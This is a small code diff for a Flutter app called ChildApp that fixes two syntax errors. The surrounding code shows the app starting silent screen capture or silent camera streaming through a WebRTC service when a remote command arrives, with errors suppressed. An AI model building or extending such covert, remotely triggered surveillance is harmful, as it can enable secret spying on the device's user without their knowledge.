@@ -14,8 +14,7 @@ import 'services/silent_webrtc_service.dart';
 import 'services/foreground_service.dart';
 import 'services/auth_service.dart';
 
-final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>());
-
+final GlobalKey<NavigatorState> childNavKey = GlobalKey<NavigatorState>();
 @pragma('vm:entry-point')
 Future<void> _firebaseMessagingBackgroundHandler(RemoteMessage message) async {
   if (Firebase.apps.isEmpty) {
@@ -91,7 +90,7 @@ class _ChildAppState extends State<ChildApp> {
       if (mode == 'screen') {
         SilentWebRTCService.instance.startSilentScreen(uid).catchError((_) {});
       } else {
-        SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {}))
+        SilentWebRTCService.instance.startSilentCamera(uid).catchError((_) {});
       }
     });
     FlutterBackgroundService().on('silent_stop').listen((_) {
